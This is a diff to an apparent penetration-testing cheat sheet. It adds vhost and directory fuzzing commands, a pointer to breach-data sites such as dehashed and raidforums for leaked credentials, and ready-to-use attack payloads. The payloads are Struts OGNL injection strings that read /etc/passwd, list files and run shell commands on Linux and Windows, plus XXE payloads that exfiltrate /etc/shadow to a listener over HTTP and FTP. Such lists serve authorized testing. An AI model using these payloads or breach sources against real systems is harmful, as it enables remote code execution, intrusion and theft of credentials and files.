@@ -47,6 +47,8 @@ inurl:example.com intitle:"index of /" "*key.pem"
 inurl:example.com ext:log
 inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
 inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
+
+# check on dehashed, raidforums.com snusbase, leakedsource, etc.
 ```
 
 get url in file
@@ -98,9 +100,12 @@ cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t Size:
 ```bash
 nmap --script http-vhosts -p 80,8080,443 <target>
 
-gobuster vhost -u <url> -w common-vhosts.txt
+gobuster vhost -u <target> -w common-vhosts.txt
 
-Burp Intruder (Host header)
+wfuzz  --hh 0  -H 'Host: FUZZ.<target_domain>' -u http://<target_ip> --hc 400 -w /usr/share/wordlists/wfuzz/general/common.txt -c
+
+# adding new vhost to /etc/hosts
+echo -e "<target_ip>\t<target_domain>" >> /etc/hosts
 ```
 
 ---
@@ -108,6 +113,8 @@ Burp Intruder (Host header)
 ### Urls
 
 ```bash
+feroxbuster -u http://<target>/ --proxy socks5://127.0.0.1:5555 -x html,txt,sql,php
+
 dirsearch -u <target> -e php,html,js,xml -x 500,403
 
 wfuzz -c -z file,/root/wordlist.txt --hc 404 <target>/FUZZ
@@ -207,7 +214,7 @@ User-Agent: <?php phpinfo(); ?>
 
 ## **Injections**
 
-### SSTI
+### SSTI (Server Side Template Injection)
 
 ```bash
 "<%= 7 * 7 %>"@example.com 
@@ -216,7 +223,7 @@ test+(${{7*7}})@example.com
 
 ---
 
-### XSS
+### XSS (Cross-Site Scripting)
 
 ```bash
 test+(<script>alert(0)</script>)@example.com
@@ -226,7 +233,7 @@ test@example(<script>alert(0)</script>).com
 
 ---
 
-### SQLI
+### SQLI (SQL Injection) 
 
 For http://site.com/?q=INJECT_HERE
 
@@ -245,6 +252,64 @@ For http://site.com/?q=INJECT_HERE
 /?q=1 or 1=1
 /?q='or''='
 ```
+
+---
+
+### ELI (Expression Language Injection)
+
+
+```bash
+#J2EEScan detection vector
+https://www.example.url/?vulnerableParameter=PRE-${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.print(new java.lang.Integer(829+9)),#kzxs.close(),1?#xx:#request.toString}-POST&INJPARAM=HOOK_VAL
+
+#Blind detection vector
+https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@java.lang.Thread@sleep(10000),1?#xx:#request.toString}
+
+
+#*RFI
+https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=new java.io.FileInputStream(#wwww),#qqqq=new java.lang.Long(#wwww.length()),#tttt=new byte[#qqqq.intValue()],#llll=#pppp.read(#tttt),#pppp.close(),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(new java.lang.String(#tttt)),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=/etc/passwd
+
+
+#DIR LIST
+https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=#wwww.listFiles(),#qqqq=@java.util.Arrays@toString(#pppp),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#qqqq),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=..
+
+
+#RCE LINUX
+https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=@java.lang.Runtime@getRuntime(),#ssss=new java.lang.String[3],#ssss[0]="/bin/sh",#ssss[1]="-c",#ssss[2]=#parameters.INJPARAM[0],#wwww.exec(#ssss),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=touch /tmp/InjectedFile.txt
+
+#RCE WINDOWS
+https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
+```
+
+---
+
+### XXE (XML External Entities)
+
+- [full list of payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
+
+```bash
+# Vanilla, used to verify outbound xxe or blind xxe
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://<listener_ip>:443/test.txt">
+]>
+<r>&sp;</r>
+
+# OoB extraction
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % data3 SYSTEM "file:///etc/shadow">
+<!ENTITY % sp SYSTEM "http://<listener_ip>:<port>/sp.dtd">
+%sp;
+%param3;
+%exfil;
+]>
+
+## External dtd: ##
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://<listener_ip>:<port>/%data3;'>">
+```
+
 
 ---
 
